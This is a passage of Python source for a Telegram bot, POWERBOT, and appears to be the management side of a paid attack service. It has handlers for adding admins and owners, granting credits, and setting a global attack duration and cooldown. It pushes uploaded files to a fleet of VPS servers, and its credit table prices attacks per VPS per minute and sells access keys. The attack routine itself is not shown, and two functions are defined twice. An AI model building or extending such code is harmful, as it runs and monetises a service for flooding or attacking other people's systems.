    try:
        command_parts = message.text.split()
        if len(command_parts) not in [2, 3]:
            safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /addadmin <admin_id> [initial_credit]
└─────────────────────────────""")
            return

        target_admin = command_parts[1]
        try:
            admin_id = int(target_admin)
        except ValueError as ve:
            safe_reply(message, """<b>❌ Invalid Admin ID</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
            return

        initial_credit = 1000  # default initial credit
        if len(command_parts) == 3:
            try:
                initial_credit = int(command_parts[2])
            except ValueError as ve:
                safe_reply(message, """<b>❌ Invalid Credit Amount</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
                return

        if str(admin_id) in admin_credits:
            safe_reply(message, f"""<b>ℹ️ Admin Exists</b>
┌─────────────────────────────
│ ID: <code>{admin_id}</code>
│ Current Balance: {admin_credits[str(admin_id)]['balance']}
└─────────────────────────────""")
            return

        admin_credits[str(admin_id)] = {
            "balance": initial_credit,
            "history": [{
                "type": "add",
                "amount": initial_credit,
                "reason": "Admin addition",
                "timestamp": datetime.now().isoformat()
            }]
        }
        try:
            save_json(ADMIN_CREDITS_FILE, admin_credits)
        except Exception as e:
            safe_reply(message, """<b>❌ Save Failed</b>
┌─────────────────────────────
│ Please try again later
└─────────────────────────────""")
            log_execution(f"Error saving admin credits in /addadmin: {e}")
            return

        safe_reply(message, f"""<b>✅ Admin Added</b>
┌─────────────────────────────
│ ID: <code>{admin_id}</code>
│ Initial Credits: {initial_credit}
└─────────────────────────────""")
    except Exception as e:
        safe_reply(message, f"""<b>❌ Unexpected Error</b>
┌─────────────────────────────
│ {str(e)}
└─────────────────────────────""")
        log_execution(f"Unexpected error in add_admin_handler: {traceback.format_exc()}")

@bot.message_handler(commands=['removeadmin'])
@owner_only
@private_chat_only
@safe_handler
def remove_admin_handler(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /removeadmin <admin_id>
└─────────────────────────────""")
            return

        target_admin = message.text.split()[1]
        try:
            admin_id = int(target_admin)
        except ValueError as ve:
            safe_reply(message, """<b>❌ Invalid Admin ID</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
            return

        if str(admin_id) not in admin_credits:
            safe_reply(message, f"""<b>❌ Admin Not Found</b>
┌─────────────────────────────
│ ID: <code>{admin_id}</code>
└─────────────────────────────""")
            return

        try:
            del admin_credits[str(admin_id)]
            save_json(ADMIN_CREDITS_FILE, admin_credits)
        except Exception as e:
            safe_reply(message, """<b>❌ Remove Failed</b>
┌─────────────────────────────
│ Please try again later
└─────────────────────────────""")
            log_execution(f"Error saving admin credits in /removeadmin: {e}")
            return

        safe_reply(message, f"""<b>✅ Admin Removed</b>
┌─────────────────────────────
│ ID: <code>{admin_id}</code>
└─────────────────────────────""")
    except Exception as e:
        safe_reply(message, f"""<b>❌ Unexpected Error</b>
┌─────────────────────────────
│ {str(e)}
└─────────────────────────────""")
        log_execution(f"Unexpected error in remove_admin_handler: {traceback.format_exc()}")

@bot.message_handler(commands=['addowner'])
@owner_only
@private_chat_only
@safe_handler
def handle_add_owner(message):
    try:
        new_owner_id = int(message.text.split()[1])
        if new_owner_id in BOT_OWNER_IDS:
            safe_reply(message, """<b>ℹ️ Already Owner</b>
┌─────────────────────────────
│ User is already an owner
└─────────────────────────────""")
            return
        
        BOT_OWNER_IDS.append(new_owner_id)
        add_credit(new_owner_id, 1000000, "Initial owner credit")
        safe_reply(message, f"""<b>✅ Owner Added</b>
┌─────────────────────────────
│ ID: <code>{new_owner_id}</code>
│ Initial Credits: 1,000,000
└─────────────────────────────""")
    except (IndexError, ValueError):
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /addowner <user_id>
└─────────────────────────────""")

@bot.message_handler(commands=['creditsystem'])
@owner_only
@safe_handler
def handle_credit_system_info(message):
    response = """╔════════════════════════════╗
<b><u>💎 CREDIT SYSTEM 💎</u></b>
╚════════════════════════════╝

<b><i>Key Generation Costs:</i></b>
┌─────────────────────────────
│ • Validity: 1 credit per 15 minutes
│ • Users: 10 credits per user slot
│ • Duration: 1 credit per 30 seconds
└─────────────────────────────

<b><i>Example:</i></b>
┌─────────────────────────────
│ /keycost 1day 10users 60duration
│ = 96 (validity) + 100 (users) + 2 (duration) 
│ = <b>198 credits</b>
└─────────────────────────────

<b><i>Current Rates:</i></b>
┌─────────────────────────────
│ • Attack: 5 credits per VPS per minute
│ • Key Generation: As calculated
│ • Admin Bonus: 1000 credits/day
└─────────────────────────────"""
    
    safe_reply(message, response)
@bot.message_handler(commands=['setduration'])
@owner_only
@private_chat_only
@safe_handler
def set_duration_handler(message):
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /setduration <seconds>
└─────────────────────────────""")
        return
    try:
        duration = int(parts[1])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid Duration</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    global global_max_duration
    global_max_duration = duration
    safe_reply(message, f"""<b>✅ Global Duration Set</b>
┌─────────────────────────────
│ {duration} seconds
└─────────────────────────────""")

@bot.message_handler(commands=['setcooldown'])
@owner_only
@private_chat_only
@safe_handler
def set_cooldown_handler(message):
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /setcooldown <seconds>
└─────────────────────────────""")
        return
    try:
        cooldown = int(parts[1])
    except ValueError:
        safe_reply(message, """<b>❌ Invalid Cooldown</b>
┌─────────────────────────────
│ Must be an integer
└─────────────────────────────""")
        return
    global global_cooldown
    global_cooldown = cooldown
    safe_reply(message, f"""<b>✅ Global Cooldown Set</b>
┌─────────────────────────────
│ {cooldown} seconds
└─────────────────────────────""")

@bot.message_handler(commands=['addall'])
@owner_only
@private_chat_only
@safe_handler
def handle_add_all_files(message):
    """Add file to all VPS"""
    if not message.reply_to_message or not message.reply_to_message.document:
        safe_reply(message, """<b>📎 File Required</b>
┌─────────────────────────────
│ Reply to a file with this command
└─────────────────────────────""")
        return
    
    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.reply_to_message.document.file_name
        
        # Store file in tracker
        file_id = str(uuid.uuid4())
        file_tracker[file_id] = {
            'name': file_name,
            'content': downloaded_file.decode('latin1'),
            'date_added': datetime.now().isoformat(),
            'vps_status': {}
        }
        
        # Add to each VPS
        success_count = 0
        for vps in vps_servers:
            status = add_file_to_vps(vps, file_name, file_tracker[file_id]['content'])
            file_tracker[file_id]['vps_status'][vps['ip']] = status
            if status:
                success_count += 1
        
        save_json(FILE_TRACKER_FILE, file_tracker)
        safe_reply(message, f"""<b>✅ File Added</b>
┌─────────────────────────────
│ Name: {file_name}
│ Success: {success_count}/{len(vps_servers)} VPS
└─────────────────────────────""")
    except Exception as e:
        safe_reply(message, f"""<b>❌ Error</b>
┌─────────────────────────────
│ {str(e)}
└─────────────────────────────""")

@bot.message_handler(commands=['removeall'])
@owner_only
@private_chat_only
@safe_handler
def handle_remove_all_files(message):
    """Remove file from all VPS"""
    if len(message.text.split()) < 2:
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /removeall <filename>
└─────────────────────────────""")
        return
    
    file_name = message.text.split()[1]
    success_count = 0
    
    for vps in vps_servers:
        if remove_file_from_vps(vps, file_name):
            success_count += 1
    
    # Remove from tracker if exists
    for file_id, data in list(file_tracker.items()):
        if data['name'] == file_name:
            del file_tracker[file_id]
    
    save_json(FILE_TRACKER_FILE, file_tracker)
    safe_reply(message, f"""<b>✅ File Removed</b>
┌─────────────────────────────
│ Name: {file_name}
│ Success: {success_count}/{len(vps_servers)} VPS
└─────────────────────────────""")

@bot.message_handler(commands=['showfiles'])
@owner_only
@safe_handler
def handle_show_files(message):
    """Show files on all VPS"""
    if not vps_servers:
        safe_reply(message, """<b>ℹ️ No VPS Configured</b>
┌─────────────────────────────
│ Use /addvps first
└─────────────────────────────""")
        return
    
    response = """╔════════════════════════════╗
<b><u>📁 VPS FILES LIST 📁</u></b>
╚════════════════════════════╝
"""
    for vps in vps_servers:
        files = list_files_on_vps(vps)
        response += f"""\n<b>VPS {vps['ip']}:</b>
<pre>{files}</pre>
"""
    
    safe_reply(message, response)

@bot.message_handler(commands=['approvechat'])
@owner_only
@safe_handler
def handle_approve_chat(message):
    """Approve a chat for commands"""
    try:
        chat_id = int(message.text.split()[1])
        if chat_id in APPROVED_CHAT_IDS:
            safe_reply(message, """<b>ℹ️ Already Approved</b>
┌─────────────────────────────
│ Chat is already approved
└─────────────────────────────""")
            return
        
        APPROVED_CHAT_IDS.append(chat_id)
        save_json(APPROVED_CHATS_FILE, APPROVED_CHAT_IDS)
        safe_reply(message, f"""<b>✅ Chat Approved</b>
┌─────────────────────────────
│ ID: <code>{chat_id}</code>
└─────────────────────────────""")
    except (IndexError, ValueError):
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /approvechat <chat_id>
└─────────────────────────────""")

@bot.message_handler(commands=['unapprovechat'])
@owner_only
@safe_handler
def handle_unapprove_chat(message):
    """Remove chat from approved list"""
    try:
        chat_id = int(message.text.split()[1])
        if chat_id not in APPROVED_CHAT_IDS:
            safe_reply(message, """<b>ℹ️ Not Approved</b>
┌─────────────────────────────
│ Chat not in approved list
└─────────────────────────────""")
            return
        
        APPROVED_CHAT_IDS.remove(chat_id)
        save_json(APPROVED_CHATS_FILE, APPROVED_CHAT_IDS)
        safe_reply(message, f"""<b>✅ Chat Unapproved</b>
┌─────────────────────────────
│ ID: <code>{chat_id}</code>
└─────────────────────────────""")
    except (IndexError, ValueError):
        safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /unapprovechat <chat_id>
└─────────────────────────────""")

# ---------------------------
# Periodic Tasks
# ---------------------------
def print_periodically():
    while True:
        time.sleep(240)  # 4 minutes
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Periodic message printed to the terminal.")

def periodic_tasks():
    """Run periodic maintenance tasks"""
    while True:
        time.sleep(3600)  # Every hour
        # Clean expired keys
        clean_expired_keys()
        
        # Rotate logs if too large
        if os.path.getsize(LOGS_FILE) > 10_000_000:
            rotated_name = f"{LOGS_FILE}.{datetime.now().strftime('%Y%m%d')}"
            os.rename(LOGS_FILE, rotated_name)
def print_periodically():
    while True:
        time.sleep(240)  # 4 minutes
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Periodic message printed to the terminal.")

def periodic_tasks():
    """Run periodic maintenance tasks"""
    while True:
        time.sleep(3600)  # Every hour
        # Clean expired keys
        clean_expired_keys()
        
        # Clean expired elite users
        for user_id in list(elite_users.keys()):
            if user_id not in users or users[user_id] not in keys:
                del elite_users[user_id]
        save_json(ELITE_USERS_FILE, elite_users)

        # Rotate logs if too large
        if os.path.getsize(LOGS_FILE) > 10_000_000:
            rotated_name = f"{LOGS_FILE}.{datetime.now().strftime('%Y%m%d')}"
            os.rename(LOGS_FILE, rotated_name)

# ---------------------------
# Main Execution
# ---------------------------
if __name__ == '__main__':
    startup_msg = """╔════════════════════════════╗
<b>🤖 POWERBOT STARTING 🤖</b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Owner IDs:</b> {owner_ids}
│ <b>Approved Chats:</b> {approved_chats}
│ <b>Active VPS:</b> {vps_count}
│ <b>Registered Users:</b> {user_count}
└─────────────────────────────""".format(
        owner_ids=BOT_OWNER_IDS,
        approved_chats=APPROVED_CHAT_IDS,
        vps_count=len(vps_servers),
        user_count=len(users)
    )
    
    # Print without HTML tags for console
    console_msg = re.sub(r'<[^>]+>', '', startup_msg)
    print(console_msg)

    # Start periodic tasks
    periodic_print_thread = threading.Thread(target=print_periodically, daemon=True)
    periodic_print_thread.start()
    
    maintenance_thread = threading.Thread(target=periodic_tasks, daemon=True)
    maintenance_thread.start()
    
    # Start bot with error recovery
    while True:
        try:
            print("Starting bot polling...")
            bot.polling(none_stop=True, interval=1, timeout=20)
        except Exception as e:
            error_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            error_msg = f"Bot crashed at {error_time}: {str(e)}\n{traceback.format_exc()}"
            print(error_msg)
            log_execution(error_msg)
            time.sleep(10)
            print("Restarting bot...")
